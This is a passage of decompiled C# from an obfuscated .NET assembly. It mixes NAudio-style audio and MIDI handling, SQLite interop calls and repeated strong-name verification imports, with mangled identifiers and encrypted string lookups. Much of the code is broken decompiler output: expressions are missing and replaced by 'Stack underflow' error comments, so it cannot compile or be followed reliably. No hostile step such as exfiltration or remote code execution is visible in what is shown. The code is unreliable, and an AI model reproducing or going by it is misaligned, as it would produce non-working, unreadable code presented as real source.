					global::_0015._0016.Enabled = flag;
				}
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		static IntPtr _0001(byte[] _0002)
		{
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_004c: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return IntPtr.Zero;
			}
			int num = ((Array)/*Error near IL_000d: Stack underflow*/).Length;
			if (num == 0)
			{
				return IntPtr.Zero;
			}
			IntPtr intPtr = _0018._0001(num);
			if (_0090_0002._009A_0005(intPtr, IntPtr.Zero))
			{
				return IntPtr.Zero;
			}
			_0088_0005._0017_000F(_0002, 0, intPtr, num);
			return intPtr;
		}

		unsafe static bool _0001(global::_0017._0080 _0002, string _0003, [Out] object _0004, ref object P_3)
		{
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0 || ((global::_0017._0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
			{
				*(object*)(nint)/*Error near IL_0011: Stack underflow*/ = _0004;
				return false;
			}
			return _0002._0001.TryGetValue(_0003, out P_3);
		}

		static void _0001(global::_0017._0015 P_0)
		{
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._0015)/*Error near IL_0009: Stack underflow*/)._0001._0001;
			IntPtr pUnknown = ((global::_0017._0015)/*Error near IL_0015: Stack underflow*/)._0001;
			AsioError num = /*Error near IL_001a: Stack underflow*/(pUnknown);
			string text = _0080._0014._0001(107356077);
			_0018._0001((global::_0017._0015)/*Error near IL_0029: Stack underflow*/, num, text);
		}

		static string _0001(IntPtr _0002)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			_0018._0001(_0003: _001C._0018._0001, _0002: (IntPtr)/*Error near IL_0019: Stack underflow*/);
			return _0018._0001((int)/*Error near IL_0010: Stack underflow*/, (IntPtr)/*Error near IL_0010: Stack underflow*/);
		}

		static void _0001(global::_0018._001A P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0018._001A)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0018._001A).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static bool _0001(MixerControlType _0002)
		{
			//IL_0003: Invalid comparison between Unknown and I4
			//IL_0007: Incompatible stack heights: 0 vs 1
			return (int)/*Error near IL_0005: Stack underflow*/ == 0;
		}

		unsafe static bool _0001([Out] _001E._0011 _0002, out ulong _0003, ref ulong P_2)
		{
			//IL_0025: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 2
			//IL_002b: Incompatible stack heights: 0 vs 1
			_ = ((_001E._0011)/*Error near IL_0007: Stack underflow*/)._0001;
			int num = ((_0019._0018)/*Error near IL_0010: Stack underflow*/)._0001(out *(ulong*)/*Error near IL_0010: Stack underflow*/, out *(ulong*)/*Error near IL_0010: Stack underflow*/);
			if (num == -1)
			{
				return false;
			}
			global::_0007._0097(num);
			return true;
		}

		static _0019._0004 _0001(int _0002)
		{
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0044: Incompatible stack heights: 0 vs 1
			_0019._0004 result = default(_0019._0004);
			_ = _0098._0089_0004;
			object obj = (_0019._0004)/*Error near IL_0014: Stack underflow*/;
			/*Error near IL_0044: Stack underflow*/(obj);
			int num = (int)/*Error near IL_0047: Stack underflow*/;
			_0018._0001(_0018._0001(_0099._008E_0004(_0002), out result, num), _0080._0014._0001(107362453));
			return result;
		}

		static bool _0001(string _0002, global::_0016._0001 P_1)
		{
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			try
			{
				new DirectoryInfo((string)/*Error near IL_0020: Stack underflow*/);
				DirectoryInfo directoryInfo = (DirectoryInfo)/*Error near IL_0023: Stack underflow*/;
				_009E_0005._007E_0090_000F(directoryInfo);
				return true;
			}
			catch
			{
			}
			return false;
		}

		static bool _0001(global::_0001._0082 _0002, IntPtr _0003, bool _0004, bool _0005, string _0006)
		{
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 2
			//IL_003e: Incompatible stack heights: 0 vs 1
			try
			{
				if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
				{
					_ = 1;
					_008F_0003._008C_0007();
					_0080._0014._0001(107356092);
					_0018._0001(_0003: _0018._0001(_0004: new object[1] { _0006 }, _0002: (IFormatProvider)/*Error near IL_0028: Stack underflow*/, _0003: (string)/*Error near IL_0028: Stack underflow*/), _0002: (_0080._0017)/*Error near IL_002d: Stack underflow*/);
				}
			}
			catch
			{
			}
			bool flag = false;
			IntPtr intPtr = IntPtr.Zero;
			try
			{
				if (_0090_0002._009A_0005(_0003, IntPtr.Zero))
				{
					return false;
				}
				int num = 0;
				num = _0018._0001(num, _001B_0003._0097_0006(), 4);
				num = _0018._0001(num, 4, _001B_0003._0097_0006());
				IntPtr intPtr2 = _0018._0001(_0003, num);
				if (_0090_0002._0099_0005(intPtr2, IntPtr.Zero))
				{
					_0018._0001(intPtr2);
					intPtr2 = IntPtr.Zero;
					_0018._0001(num, _0003, intPtr2);
				}
				if (_0006 == null)
				{
					return true;
				}
				intPtr = _0018._0001(_0006);
				_0018._0001(num, _0003, intPtr);
				flag = true;
			}
			catch (Exception ex)
			{
				try
				{
					if (_0005)
					{
						_0018._0001(-2146233088, _0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107356059), new object[1] { ex }));
					}
				}
				catch
				{
				}
			}
			finally
			{
				if (!flag && _0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					_0018._0001(intPtr);
					intPtr = IntPtr.Zero;
				}
			}
			return flag;
		}

		static void _0001(string _0002, global::_0017._0080 _0003, int P_2)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0033: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107358459));
			}
			_0003._0001._0001((_0080._0017)P_2, _0002);
		}

		static void _0001(global::_000E._0005 _0002, _0005 P_1)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			EventHandler<global::_0001._0006> eventHandler = ((global::_000E._0005)/*Error near IL_0007: Stack underflow*/)._0001;
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0)
			{
				eventHandler(_0002, new global::_0001._0006(P_1._0001, P_1._0001._0002));
			}
		}

		unsafe static void _0001(IntPtr _0002, IntPtr[] _0003, int _0004, int _0005)
		{
			//IL_005a: Incompatible stack heights: 0 vs 2
			//IL_0061: Incompatible stack heights: 0 vs 1
			_ = _0010_0005._0096_000E;
			/*Error near IL_0061: Stack underflow*/((IntPtr)/*Error near IL_0061: Stack underflow*/);
			float* ptr = (float*)/*Error near IL_0064: Stack underflow*/;
			short* ptr2 = (short*)_0010_0005._0096_000E(_0003[0]);
			short* ptr3 = (short*)_0010_0005._0096_000E(_0003[1]);
			for (int i = 0; i < _0005; i++)
			{
				short* num = ptr2;
				ptr2 = num + 1;
				*num = _0018._0001((double)(*ptr));
				short* num2 = ptr3;
				ptr3 = num2 + 1;
				*num2 = _0018._0001((double)ptr[1]);
				ptr += 2;
			}
		}

		static long _0001(_007F._0008 _0002, long P_1)
		{
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Expected I8, but got Unknown
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 2
			//IL_001c: Incompatible stack heights: 0 vs 1
			_ = ((_007F._0008)/*Error near IL_0007: Stack underflow*/)._0001;
			int num = ((_007F._0008)/*Error near IL_0011: Stack underflow*/)._0002;
			_003F val = /*Error near IL_0013: Stack underflow*// num;
			return /*Error near IL_0014: Stack underflow*/* val;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_win32_compact_heap")]
		static extern _0080._0017 _0001(ref uint _0002);

		[DllImport("winmm.dll", EntryPoint = "midiOutClose")]
		static extern MmResult _0001(IntPtr _0002);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0010._0002 P_0)
		{
			//IL_0067: Incompatible stack heights: 0 vs 2
			//IL_0071: Incompatible stack heights: 0 vs 2
			_ = global::_0008._0017_0002;
			/*Error near IL_006e: Stack underflow*/((object)/*Error near IL_006e: Stack underflow*/);
			_ = _0092_0005._0081_000F;
			SizeF sizeF = new SizeF(6f, 13f);
			/*Error near IL_0024: Stack underflow*/((object)/*Error near IL_0024: Stack underflow*/, sizeF);
			_0093_0005._0082_000F(P_0, (AutoScaleMode)1);
			_0082_0003._0013_0007(P_0, _0080._0014._0001(107355994));
			_008C_0005._001B_000F(P_0, new Size(32, 32));
			global::_0005._0092(P_0, false);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_blob_read")]
		static extern _0080._0017 _0001(IntPtr _0002, [MarshalAs(UnmanagedType.LPArray)] byte[] _0003, int _0004, int _0005);

		static void _0001(_0014 P_0)
		{
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 1
			if (((_0014)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				((_0014)/*Error near IL_0010: Stack underflow*/)._0001._0001();
				P_0._0001 = null;
			}
			P_0._0001 = new _001F._0019(P_0._0001.Connection, P_0, P_0._0001);
		}

		static void _0001(_001E._0004 P_0)
		{
			//IL_0012: Incompatible stack heights: 0 vs 2
			//IL_0019: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			((_001E._0004)/*Error near IL_000c: Stack underflow*/)._0001._0001();
			/*Error near IL_0020: Stack underflow*/((int)/*Error near IL_0020: Stack underflow*/);
		}

		static bool _0001(global::_0016._001E P_0)
		{
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_0012: Incompatible stack heights: 0 vs 1
			_0018._0001();
			if ((int)/*Error near IL_0009: Stack underflow*/ >= 3010000)
			{
				return true;
			}
			return false;
		}

		static void _0001(global::_0001._001F _0002, int _0003)
		{
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			global::_0001._001F._0001((global::_0001._001F)/*Error near IL_0047: Stack underflow*/);
			IntPtr intPtr = (IntPtr)/*Error near IL_004a: Stack underflow*/;
			_0018._0001(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107355989), new object[2] { intPtr, _0003 }));
		}

		static void _0001(int _0002, global::_0001._001F _0003, byte[] _0004)
		{
			//IL_006a: Incompatible stack heights: 0 vs 1
			//IL_0071: Incompatible stack heights: 0 vs 1
			global::_0001._001F._0001((global::_0001._001F)/*Error near IL_0071: Stack underflow*/);
			IntPtr intPtr = (IntPtr)/*Error near IL_0074: Stack underflow*/;
			_0018._0001(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107355831), new object[4]
			{
				intPtr,
				_0002,
				_0091._0080_0004(typeof(byte[]).TypeHandle),
				(_0004 != null) ? _0018._0001(_0004) : _0080._0014._0001(107357341)
			}));
		}

		static global::_0010._001C _0001(_001D._0019 _0002, bool P_1)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 2
			_0018._0001((_001D._0019)/*Error near IL_001f: Stack underflow*/);
			_ = _009F_0005._0091_000F;
			return (global::_0010._001C)/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, P_1);
		}

		static void _0001(global::_0001._0082._0001 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0001._0082._0001)/*Error near IL_0007: Stack underflow*/)._0003)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0001._0082._0001).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static void _0001(global::_0017._0019 P_0)
		{
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_0076: Incompatible stack heights: 0 vs 1
			((global::_0017._0019)/*Error near IL_0007: Stack underflow*/)._0001._0001(global::_0006._0011._0008, IntPtr.Zero);
			((global::_0017._0019)/*Error near IL_001a: Stack underflow*/)._0001._0001(global::_0006._0011._0002, IntPtr.Zero);
			int num;
			do
			{
				num = P_0._0002();
			}
			while (num > 0);
			P_0._0002 = 0;
			P_0._0001 = 0;
			P_0._0001 = 0L;
			P_0._0002 = 0L;
			P_0._0001._0001(global::_0006._0011._0007, IntPtr.Zero);
			P_0._0002 = false;
		}

		[DllImport("winmm.dll", EntryPoint = "midiInStop")]
		static extern MmResult _0001(IntPtr _0002);

		[DllImport("Msacm32.dll", EntryPoint = "acmStreamConvert")]
		static extern MmResult _0001(IntPtr _0002, [In][Out] global::_0013._000E _0003, _007F._0005 _0004);

		static void _0001(global::_0004._0001 P_0)
		{
			//IL_00aa: Incompatible stack heights: 0 vs 1
			//IL_00b4: Incompatible stack heights: 0 vs 3
			//IL_00be: Incompatible stack heights: 0 vs 3
			try
			{
				_000E_0005._0094_000E(global::_0015._0001._001A);
				if (((Array)/*Error near IL_0012: Stack underflow*/).Length == 0)
				{
					_ = global::_001C._0097_0003;
					_ = global::_0011._008E_0002;
					_0018._0001();
					_ = global::_0015._0001._001A;
					_ = global::_000E._008A_0002;
					_0080._0014._0001(107362099);
					char[] obj = new char[1] { '!' };
					string obj2 = /*Error near IL_0047: Stack underflow*/((object)/*Error near IL_0047: Stack underflow*/, obj)[0];
					string text = /*Error near IL_004e: Stack underflow*/((string)/*Error near IL_004e: Stack underflow*/, (string)/*Error near IL_004e: Stack underflow*/, obj2);
					if (/*Error near IL_0053: Stack underflow*/(text))
					{
						_0018._0001(P_0, global::_0011._008E_0002(_0018._0001(), global::_0015._0001._001A, global::_0002._007E_0006(global::_000E._008A_0002(_0080._0014._0001(107362099), new char[1] { '!' })[0])));
					}
				}
			}
			catch
			{
			}
		}

		static int _0001(IntPtr _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			_0018._0001((IntPtr)/*Error near IL_000d: Stack underflow*/);
			return (int)/*Error near IL_0005: Stack underflow*/;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0016._0015 _0001()
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			_0018._0001(out global::_0016._0015 _);
			return (global::_0016._0015)/*Error near IL_0007: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, EntryPoint = "sqlite3_open16")]
		static extern _0080._0017 _0001(string _0002, ref IntPtr _0003);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(_001D._0004 P_0)
		{
			//IL_0060: Incompatible stack heights: 0 vs 1
			//IL_0063: Incompatible stack heights: 0 vs 2
			for (int i = 0; i < P_0.NumberOfBuffers; i++)
			{
				_ = ((_001D._0004)/*Error near IL_000c: Stack underflow*/)._0001;
				if ((((global::_0007._0007)((object[])/*Error near IL_000f: Stack underflow*/)[/*Error near IL_000f: Stack underflow*/])._0001._0001 & global::_000E._0004._0004) != global::_000E._0004._0004)
				{
					if (!_0018._0001(P_0._0001[i]))
					{
						P_0._0001 = _001C._0005._0001;
						break;
					}
					_0006_0003._0084_0006(ref P_0._0001);
				}
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0016._0014 P_0)
		{
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			//IL_0058: Incompatible stack heights: 0 vs 1
			_ = ((global::_0016._0014)/*Error near IL_0007: Stack underflow*/)._0001[0];
			_0018._0001((global::_0016._0014)/*Error near IL_0011: Stack underflow*/);
			IEnumerator<global::_0013._0010> enumerator = ((IEnumerable<global::_0013._0010>)/*Error near IL_0016: Stack underflow*/).GetEnumerator();
			try
			{
				while (global::_001B._007E_0086_0003(enumerator))
				{
					global::_0013._0010 current = enumerator.Current;
					_0018._0001(0, current, P_0);
				}
			}
			finally
			{
				if (enumerator != null)
				{
					global::_0008._007E_0098(enumerator);
				}
			}
			P_0._0001();
		}

		static void _0001(bool _0002, global::_0001._0082._0001 P_1)
		{
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			if (!((global::_0001._0082._0001)/*Error near IL_0007: Stack underflow*/)._0003)
			{
				if (((global::_0001._0082._0001)/*Error near IL_0010: Stack underflow*/)._0001 != null)
				{
					((global::_0001._0082._0001)/*Error near IL_001a: Stack underflow*/)._0001 = null;
				}
				P_1._0003 = true;
			}
		}

		static global::_0014._0011 _0001(BinaryReader _0002)
		{
			//IL_0114: Incompatible stack heights: 0 vs 2
			//IL_011e: Incompatible stack heights: 0 vs 1
			_ = _008D_0002._007E_0096_0005;
			/*Error near IL_011e: Stack underflow*/((object)/*Error near IL_011e: Stack underflow*/);
			MetaEventType metaEventType = (MetaEventType)/*Error near IL_0124: Stack underflow*/;
			int num = _0018._0001(_0002);
			global::_0014._0011 obj = new global::_0014._0011();
			switch (metaEventType)
			{
			case MetaEventType.TrackSequenceNumber:
				obj = new global::_0014._0012(_0002, num);
				break;
			case MetaEventType.TextEvent:
			case MetaEventType.Copyright:
			case MetaEventType.SequenceTrackName:
			case MetaEventType.TrackInstrumentName:
			case MetaEventType.Lyric:
			case MetaEventType.Marker:
			case MetaEventType.CuePoint:
			case MetaEventType.ProgramName:
			case MetaEventType.DeviceName:
				obj = new global::_0010._0011(_0002, num);
				break;
			case MetaEventType.EndTrack:
				if (num != 0)
				{
					throw new FormatException(_0080._0014._0001(107355924));
				}
				break;
			case MetaEventType.SetTempo:
				obj = new _000F(_0002, num);
				break;
			case MetaEventType.TimeSignature:
				obj = new _001B._0012(_0002, num);
				break;
			case MetaEventType.KeySignature:
				obj = new _001B._0011(_0002, num);
				break;
			case MetaEventType.SequencerSpecific:
				obj = new global::_000E._0015(_0002, num);
				break;
			case MetaEventType.SmpteOffset:
				obj = new global::_0013._0012(_0002, num);
				break;
			default:
			{
				byte[] array = _0083_0002._007E_008C_0005(_0002, num);
				if (array.Length != num)
				{
					throw new FormatException(_0080._0014._0001(107355387));
				}
				return new global::_000E._0013(metaEventType, 0L, array);
			}
			}
			obj._0001 = metaEventType;
			obj._0001 = num;
			return obj;
		}

		static global::_0005._0005 _0001(global::_0005._0005 _0002, int _0003)
		{
			//IL_004c: Incompatible stack heights: 0 vs 1
			//IL_004f: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			if (((global::_0005._0005)/*Error near IL_0007: Stack underflow*/)._0001 == WaveFormatEncoding.Pcm)
			{
				return new global::_0005._0005(_001A_009C_0002: ((global::_0005._0005)/*Error near IL_0013: Stack underflow*/)._0003, _008F_008F_0006: _0002._0001, _0005_0080: (int)/*Error near IL_001e: Stack underflow*/);
			}
			if (_0002._0001 == WaveFormatEncoding.IeeeFloat)
			{
				return _0018._0001(_0003, (int)_0002._0001);
			}
			throw new ArgumentException(_0080._0014._0001(107355302));
		}

		static bool _0001(string _0002, bool _0003, bool _0004, global::_0017._0086 _0005, global::_0001._0082 _0006)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return false;
			}
			_ = ((global::_0017._0086)/*Error near IL_0036: Stack underflow*/).NativeHandle;
			IntPtr intPtr = (IntPtr)/*Error near IL_000b: Stack underflow*/;
			if (_0090_0002._009A_0005(intPtr, IntPtr.Zero))
			{
				return false;
			}
			return _0018._0001(_0006, intPtr, _0004, _0003, _0002);
		}

		static void _0001(_001F._0019 _0002, int P_1)
		{
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_0028: Stack underflow*/);
			if (((_001F._0019)/*Error near IL_000b: Stack underflow*/)._0001[P_1]._0003 == -1)
			{
				throw new InvalidCastException();
			}
		}

		static global::_000E._000E _0001(IntPtr _0002)
		{
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_002d: Stack underflow*/((IntPtr)/*Error near IL_002d: Stack underflow*/, zero);
			if ((int)/*Error near IL_0010: Stack underflow*/ != 0)
			{
				_0080._0014._0001(107355285);
				throw new ArgumentException((string?)/*Error near IL_001c: Stack underflow*/);
			}
			return new global::_000E._000E(_001B._0007._0003, _0002);
		}

		static DataTable _0001(global::_0017._0080 _0002, string _0003, string _0004, string P_3)
		{
			//IL_03b4: Incompatible stack heights: 0 vs 1
			//IL_03be: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107355256);
			new DataTable((string?)/*Error near IL_03be: Stack underflow*/);
			DataTable dataTable = default(DataTable);
			if (0 == 0)
			{
				dataTable = (DataTable)/*Error near IL_03c4: Stack underflow*/;
			}
			_0001_0005._007E_008A_000E(dataTable, _008F_0003._008B_0007());
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362308), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362799), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362814), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107355215), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107355230), _0091._0080_0004(typeof(long).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107355217), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107355196), _0091._0080_0004(typeof(string).TypeHandle));
			global::_0008._007E_0011_0002(dataTable);
			if (global::_001C._0096_0003(_0003))
			{
				_0003 = _0080._0014._0001(107401775);
			}
			string text = ((_009D_0003._009D_0007(_0003, _0080._0014._0001(107401766), StringComparison.OrdinalIgnoreCase) == 0) ? _0080._0014._0001(107362630) : _0080._0014._0001(107362683));
			global::_0010._001C obj = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107355139), new object[2] { _0003, text }), _0002);
			try
			{
				_0014 obj2 = _0018._0001(obj);
				try
				{
					while (global::_001B._007E_008F_0003(obj2))
					{
						string text2 = _009E_0003._007E_0001_0008(obj2, 0);
						if (_0096_0003._0095_0007(_009E_0003._007E_0001_0008(obj2, 2), 0, _0080._0014._0001(107355541), 0, 7, StringComparison.OrdinalIgnoreCase) == 0)
						{
							text2 = _0080._0014._0001(107355496);
						}
						if ((_009D_0003._009D_0007(P_3, text2, StringComparison.OrdinalIgnoreCase) == 0 || P_3 == null) && (_009D_0003._009D_0007(_009E_0003._007E_0001_0008(obj2, 2), _0004, StringComparison.OrdinalIgnoreCase) == 0 || _0004 == null))
						{
							DataRow dataRow = _0005_0005._007E_008E_000E(dataTable);
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362308), _0003);
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362814), _009E_0003._007E_0001_0008(obj2, 2));
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107355215), text2);
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107355230), _009C_0005._007E_008E_000F(obj2, 5));
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107355217), _0004_0005._007E_008D_000E(obj2, 3));
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107355196), _009E_0003._007E_0001_0008(obj2, 4));
							_0007_0005._007E_0090_000E(_0006_0005._007E_008F_000E(dataTable), dataRow);
						}
					}
				}
				finally
				{
					if (obj2 != null)
					{
						global::_0008._007E_0098(obj2);
					}
				}
			}
			finally
			{
				if (obj != null)
				{
					global::_0008._007E_0098(obj);
				}
			}
			global::_0008._007E_0013_0002(dataTable);
			global::_0008._007E_0012_0002(dataTable);
			return dataTable;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(double _0002, global::_000F._0006 P_1)
		{
			//IL_0057: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 2
			object obj = ((global::_000F._0006)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
			try
			{
				P_1._0001 = 0;
				P_1._0002 = (int)(_0002 * (double)P_1._0001.WaveFormat._0001 / 1000.0);
				P_1._0001 = global::_000F._0006._0001._0004;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		static void _0001(_0080._0004 _0002, Array P_1)
		{
			//IL_001c: Incompatible stack heights: 0 vs 2
			//IL_001f: Incompatible stack heights: 0 vs 2
			//IL_0022: Incompatible stack heights: 0 vs 1
			_ = _0098_0002._000F_0006;
			_ = ((_0080._0004)/*Error near IL_000c: Stack underflow*/)._0001;
			int num = ((_0080._0004)/*Error near IL_0015: Stack underflow*/)._0001;
			/*Error near IL_001a: Stack underflow*/((Array)/*Error near IL_001a: Stack underflow*/, (Array)/*Error near IL_001a: Stack underflow*/, num);
		}

		static byte[] _0001(byte[] _0002, byte[] _0003, byte[] _0004)
		{
			//IL_000e: Incompatible stack heights: 0 vs 2
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			_ = 2;
			return _0018._0001((int)/*Error near IL_000c: Stack underflow*/, (byte[])/*Error near IL_000c: Stack underflow*/, (byte[])/*Error near IL_000c: Stack underflow*/, (byte[])/*Error near IL_000c: Stack underflow*/);
		}

		static void _0001(_001C._0017 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((_001C._0017)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(_001C._0017).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static void _0001(global::_0010._001C P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0010._001C)/*Error near IL_0007: Stack underflow*/)._0002)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0010._001C).TypeHandle);
